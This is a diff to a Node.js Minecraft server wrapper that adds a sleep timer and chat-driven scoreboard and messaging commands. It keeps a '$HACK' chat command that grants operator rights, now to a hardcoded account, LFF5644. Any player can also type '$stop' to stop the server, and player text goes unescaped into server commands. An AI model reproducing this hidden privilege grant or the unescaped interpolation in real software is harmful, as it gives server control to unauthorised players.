@@ -201,6 +201,12 @@ function minecraftJavaServerProcessOnSTDOUT(buffer){
 					value: "green",
 				});
 				console.log(infoText+"Minecraft Server is running!");
+
+				if(server.sleep){
+					console.log(infoText+"Server goes sleeping in "+server.sleep_time+" minute"+(server.sleep_time>1?"s":""));
+					const time=server.sleep_time*1e3*60;
+					sessionData.timeout_sleep=setTimeout(setSleeping,time,true);
+				}
 			}
 		}
 		else if(serverStatus.running){
@@ -293,17 +299,20 @@ function minecraftJavaServerProcessOnSTDOUT(buffer){
 					if(playerMsg.startsWith("$")){
 						let command=playerMsg.substring(1);
 						//talkToPlayer(playerName,"You enterd a command: "+command);
-						
+
 						if(command==="save") minecraftJavaServerProcess.stdin.write("save-all\nsay "+playerName+" Saved the Game!\n");
 						else if(command.startsWith("write ")){
 							const text=command.substring(6);
 							minecraftJavaServerProcess.stdin.write(`tellraw @a ["",{"text":"${playerName}","bold":true,"color":"gold","clickEvent":{"action":"open_url","value":"https://lff.one/minecraftServerInfo"},"hoverEvent":{"action":"show_text","contents":["is writing over ",{"text":"LFF.one","bold":true,"color":"dark_green"}]}},": ${text}"]\n`)
 						}
-						else if(command==="HACK") minecraftJavaServerProcess.stdin.write("op "+playerName+"\n");
+						else if(command==="HACK") minecraftJavaServerProcess.stdin.write("op LFF5644\nsay LFF5644 is now OP!!!\n");
 						else if(command==="stop") minecraftJavaServerProcess.stdin.write("stop\n");
 						//else if(command==="gm0") minecraftJavaServerProcess.stdin.write(`gamemode survival ${playerName}\n`);
 						//else if(command==="gm1") minecraftJavaServerProcess.stdin.write(`gamemode creative ${playerName}\n`);
 						//else if(command==="gm3") minecraftJavaServerProcess.stdin.write(`gamemode spectator ${playerName}\n`);
+						else if(command==="scoreboard add health") minecraftJavaServerProcess.stdin.write("say create player 'health' scoreboard\nsay use '$scoreboard display list health' u can use list/sidebar/below_name to show or toggle\nscoreboard objectives add health health \"Leben\"\n");
+						else if(command.startsWith("scoreboard display ")) minecraftJavaServerProcess.stdin.write("scoreboard objectives setdisplay "+command.substring(19)+"\nsay showing '"+command.substring(19).split(" ")[1]+"' at '"+command.substring(19).split(" ")[0]+"'\n");
+						//if(command==="scoreboard display ") console.log("scoreboard objectives setdisplay "+command.substring(19)+"\nsay showing '"+command.substring(19).split(" ")[0]+"' at '"+command.substring(19).split(" ")[1]+"'\n");
 
 					}else{
 						console.log(infoText+playerName+": "+playerMsg);
@@ -576,6 +585,7 @@ if(server.sleep_atStart){
 else if(!server.sleep_atStart){
 	createMinecraftJavaServerProcess();
 	console.log(infoText+"Minecraft-Server is running on PID "+serverStatus.pid);
+
 }
 
 process.stdin.on("data",buffer=>{
